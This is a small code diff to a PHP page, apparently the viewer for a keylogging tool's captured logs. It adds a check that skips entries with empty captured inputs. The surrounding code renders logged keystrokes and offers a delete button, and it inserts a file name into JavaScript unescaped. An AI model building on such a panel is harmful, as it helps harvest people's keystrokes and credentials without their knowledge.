@@ -129,6 +129,11 @@
                         $time = $i["time"];
                         $inputs = $i["inputs"];
 
+                        // Check if $inputs is empty and skip this row if it is
+                        if (empty($inputs)) {
+                            continue;
+                        }
+
                         $keylogs = str_replace([" <Shift> ", "<TAB>"], ['', '\n'], $i["keyLogs"]);
 
                         echo "
@@ -142,6 +147,7 @@
                                     <i title='Remove log' class='rlogs material-icons' onclick=\"remove_log('$log_file', this);\">delete_forever</i>
                                 </td>
                             </tr>";
+
                     }
                 }
             }
